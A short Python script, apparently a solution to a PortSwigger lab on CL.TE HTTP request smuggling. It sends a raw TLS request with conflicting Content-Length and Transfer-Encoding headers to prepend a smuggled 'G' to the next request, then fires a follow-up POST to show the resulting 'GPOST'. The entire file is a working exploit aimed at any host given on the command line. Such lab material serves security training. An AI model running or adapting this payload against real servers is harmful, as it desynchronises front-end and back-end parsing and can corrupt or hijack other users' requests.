# P https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
import socket
import sys
import ssl
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').replace('https://','')

context = ssl.create_default_context()

gpost_data = f'''POST / HTTP/1.1\r\n\
Host: {site}\r\n\
Connection: keep-alive\r\n\
Content-Type: application/x-www-form-urlencoded\r\n\
Content-Length: 6\r\n\
Transfer-Encoding: chunked\r\n\
\r\n\
0\r\n\
\r\n\
G\r\n\
\r\n'''

# First request to create the confusion
with socket.create_connection((site, 443)) as sock:
    with context.wrap_socket(sock, server_hostname=site) as ssock:
        print(ssock.version())
        ssock.send(gpost_data.encode())
        response = ssock.recv(4096)
        http_response = repr(response)
        print(http_response)

# Next requests gets remnants of the smuggled one, resulting in the GPOST
print(f'Attempting to get https://{site}')
s = requests.Session()
resp = s.post(f'https://{site}')
print(resp.text)
